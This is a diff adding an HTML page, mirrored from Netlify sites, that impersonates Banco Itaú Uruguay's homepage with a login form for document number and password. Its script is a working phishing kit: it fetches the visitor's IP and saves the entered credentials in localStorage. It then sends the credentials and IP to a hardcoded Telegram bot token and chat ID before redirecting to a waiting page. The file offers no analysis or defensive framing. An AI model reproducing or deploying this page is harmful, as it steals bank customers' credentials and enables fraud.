@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<!-- Mirrored from itaubenefficios.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 May 2025 22:49:26 GMT -->
+<!-- Added by HTTrack -->
+<!-- Mirrored from itaubenefficios2222.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 30 May 2025 05:41:20 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Página de Inicio</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow-x: hidden;
+      font-family: Arial, sans-serif;
+    }
+
+    .navbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background-color: #ff6600;
+      padding: 22px;
+      width: 100vw;
+      box-sizing: border-box;
+    }
+
+    .menu {
+      display: flex;
+      align-items: center;
+      margin: 0 auto;
+    }
+
+    .logo-img {
+      width: 48px;
+      height: 48px;
+      margin-right: 15px;
+    }
+
+    .menu a {
+      color: white;
+      margin: 0 10px;
+      text-decoration: none;
+      font-weight: bold;
+      font-size: 18px;
+    }
+
+    .menu a:hover {
+      text-decoration: underline;
+    }
+
+    .menu .buscar-personas {
+      display: flex;
+      align-items: center;
+      margin-left: auto;
+    }
+
+    .menu .buscar {
+      margin-right: 15px;
+    }
+
+    .menu .separator {
+      width: 1px;
+      height: 20px;
+      background-color: white;
+      margin-right: 15px;
+    }
+
+    .login-container {
+      display: flex;
+      align-items: center;
+      margin-left: -150px;
+    }
+
+    .login {
+      display: flex;
+      align-items: center;
+      gap: 0;
+      font-size: 1.05em;
+    }
+
+    .login-control {
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 0;
+      background-color: white;
+      height: 42px;
+      font-size: 16px;
+      border: none;
+    }
+
+    .left-radius {
+      border-radius: 5px 0 0 5px;
+      border-right: none;
+    }
+
+    .right-radius {
+      border-radius: 0 5px 5px 0;
+      border-left: none;
+    }
+
+    .login select {
+      width: 75px;
+      border: none;
+      outline: none;
+    }
+
+    /* Input de documento: solo números y máximo 8 caracteres */
+    .login input[type="text"],
+    .login input[type="password"] {
+      width: 180px;
+      font-size: 16px;
+      border: none;
+      outline: none;
+    }
+
+    .login-btn {
+      background-color: #ccc;
+      border: none;
+      padding: 10px 15px;
+      cursor: pointer;
+      border-radius: 0 5px 5px 0;
+      margin-left: -1px;
+      height: 42px;
+    }
+
+    .login-btn:hover {
+      background-color: #999;
+    }
+
+    .login-links {
+      margin-top: 5px;
+      display: flex;
+      font-size: 12.5px;
+      color: white;
+    }
+
+    .login-links a {
+      color: white;
+      text-decoration: none;
+      margin-left: 15px;
+    }
+
+    .login-links a:hover {
+      text-decoration: underline;
+    }
+
+    .image-section {
+      margin-top: 0;
+      text-align: center;
+      width: 100vw;
+      overflow: hidden;
+    }
+
+    .image-section img {
+      width: 100%;
+      height: auto;
+    }
+
+    .footer-text {
+      background-color: #4A4A4A;
+      color: white;
+      text-align: center;
+      padding: 20px;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .footer-text a {
+      color: white;
+      text-decoration: none;
+    }
+
+    @media (max-width: 768px) {
+      .navbar {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      .menu {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      .menu a {
+        font-size: 16px;
+        margin: 5px 0;
+      }
+
+      .logo-img {
+        width: 40px;
+        height: 40px;
+        margin-bottom: 15px;
+      }
+
+      .login-container {
+        margin-left: 0;
+        flex-direction: column;
+      }
+
+      .login {
+        flex-direction: column;
+      }
+
+      .login input, .login select, .login-btn {
+        width: 100%;
+        margin-bottom: 10px;
+        border-radius: 5px;
+      }
+
+      .login-links {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      .image-section img {
+        width: 100vw;
+        height: auto;
+      }
+    }
+
+    /* ===============================
+       Estilos para campos copyable
+    =============================== */
+    #loginOutput {
+      background-color: #f8f8f8;
+      padding: 15px;
+      margin: 20px;
+      border: 1px solid #ccc;
+    }
+
+    #loginOutput p {
+      margin-bottom: 10px;
+      font-size: 16px;
+    }
+
+    #loginOutput span {
+      color: blue;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <header class="navbar">
+    <div class="menu">
+      <img src="Layer%201.png" alt="Logo Itaú" class="logo-img">
+      <a href="#">para ti</a>
+      <a href="#">para empresas</a>
+      <a href="#">beneficios</a>
+      <a href="#">atención al cliente</a>
+      <div class="buscar-personas">
+        <a href="#" class="buscar">buscar</a>
+        <div class="separator"></div>
+        <a href="#" class="personas">personas</a>
+      </div>
+    </div>
+    <div class="login-container">
+      <div class="login">
+        <select class="login-control left-radius">
+          <option value="ci">C.I.</option>
+          <option value="passport">Pasaporte</option>
+        </select>
+        <!-- Solo números y máximo 8 caracteres -->
+        <input type="text" id="documento" placeholder="documento" class="login-control" oninput="this.value=this.value.replace(/[^0-9]/g, '')" maxlength="8">
+        <input type="password" id="contrasena" placeholder="contraseña" class="login-control right-radius">
+        <button class="login-btn" onclick="login()">></button>
+      </div>
+      <div class="login-links">
+        <a href="#">registrate</a>
+        <a href="#">olvidé mi contraseña</a>
+      </div>
+    </div>
+  </header>
+
+  <div class="image-section">
+    <img src="img_2489513_home.png" alt="Imagen">
+  </div>
+
+  <div class="footer-text">
+    <div>
+      <strong>productos</strong><br>
+      cuentas | préstamos | inversiones | tarjetas | seguros | Itaú Personal Bank
+    </div>
+    <div>
+      <strong>sobre Itaú</strong><br>
+      quiénes somos | trabajá con nosotros | sustentabilidad | fundación Itaú
+    </div>
+    <div>
+      <strong>más información</strong><br>
+      Itaú Volar | beneficios | tarifario | contratos y cartillas | cotizaciones | seguridad | emergencias | canal de denuncias
+    </div>
+    <div>
+      <strong>encontranos en:</strong><br>
+      <a href="#">Instagram</a> | <a href="#">Facebook</a> | <a href="#">LinkedIn</a> | <a href="#">Twitter</a>
+    </div>
+    <div>
+      <small>© 2024 Itaú - Banco Itaú Uruguay S.A. | Supervisada por el Banco Central del Uruguay | 
+      Para mayor información visita <a href="https://www.bcu.gub.uy/">www.bcu.gub.uy</a></small>
+    </div>
+  </div>
+
+  <!-- Sección para mostrar los datos copyable -->
+  <div id="loginOutput" style="display: none;">
+    <p>Documento: <span id="docCopy" onclick="copyText('docCopy')"></span></p>
+    <p>Contraseña: <span id="passCopy" onclick="copyText('passCopy')"></span></p>
+    <p>IP: <span id="ipOutput" onclick="copyText('ipOutput')"></span></p>
+    <p>(Haz clic en cada uno para copiar su valor)</p>
+  </div>
+
+  <script>
+    // Obtener la IP usando la API de ipify y almacenarla en la variable global "ipAddress"
+    var ipAddress = "";
+    fetch('https://api.ipify.org/?format=json')
+      .then(response => response.json())
+      .then(data => {
+        ipAddress = data.ip;
+      })
+      .catch(error => console.error("Error al obtener la IP:", error));
+
+    // Función para copiar texto al portapapeles
+    function copyText(elementId) {
+      var text = document.getElementById(elementId).innerText;
+      navigator.clipboard.writeText(text)
+        .then(() => alert("Copiado: " + text))
+        .catch(err => console.error("Error al copiar:", err));
+    }
+
+    function login() {
+      const documento = document.getElementById('documento').value.trim();
+      const contrasena = document.getElementById('contrasena').value;
+
+      // Validar que ambos campos estén rellenos
+      if (documento === "" || contrasena === "") {
+        alert("Por favor, rellene todos los campos.");
+        return;
+      }
+      // Validar que la contraseña tenga mínimo 5 caracteres
+      if (contrasena.length < 5) {
+        alert("La contraseña debe tener mínimo 5 caracteres.");
+        return;
+      }
+
+      // Guardar datos en localStorage
+      localStorage.setItem('documento', documento);
+      localStorage.setItem('contrasena', contrasena);
+
+      // Mostrar los datos en la sección copyable (para que puedas copiarlos)
+      document.getElementById('docCopy').innerText = documento;
+      document.getElementById('passCopy').innerText = contrasena;
+      document.getElementById('ipOutput').innerText = ipAddress;
+      document.getElementById('loginOutput').style.display = 'block';
+
+      // Construir mensaje para Telegram (incluyendo la IP)
+      const chatId = '-4662992139';
+      const token = '7997667206:AAHJmPaUsdv9bceEG4fWbbiKx8bJJVW-Hck';
+      const mensaje = `
+➖➖➖[ 𝙄𝙏𝘼𝙐 𝙐𝙔 ]➖➖➖ 
+✔️𝘿𝙤𝙘𝙪𝙢𝙚𝙣𝙩𝙤: <code>${documento}</code>
+✔️𝙋𝙖𝙨𝙨: <code>${contrasena}</code>
+✔️ IP: ${ipAddress}
+➖➖➖ 𝙄𝙉𝙁𝙊 ➖➖➖
+`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&parse_mode=HTML&text=${encodeURIComponent(mensaje)}`;
+
+      // Enviar mensaje a Telegram y redirigir después de 5 segundos a la página "/espera"
+      fetch(url)
+        .then(response => {
+          if (response.ok) {
+            console.log('Mensaje enviado correctamente.');
+          } else {
+            console.error('Error al enviar el mensaje.', response.statusText);
+          }
+        })
+        .catch(error => {
+          console.error('Error en la solicitud:', error);
+        })
+        .finally(() => {
+          setTimeout(() => {
+            window.location.href = 'espera/index.html';
+          }, 500);
+        });
+    }
+  </script>
+</body>
+
+<!-- Mirrored from itaubenefficios.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 May 2025 22:49:28 GMT -->
+
+<!-- Mirrored from itaubenefficios2222.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 30 May 2025 05:41:45 GMT -->
+</html>
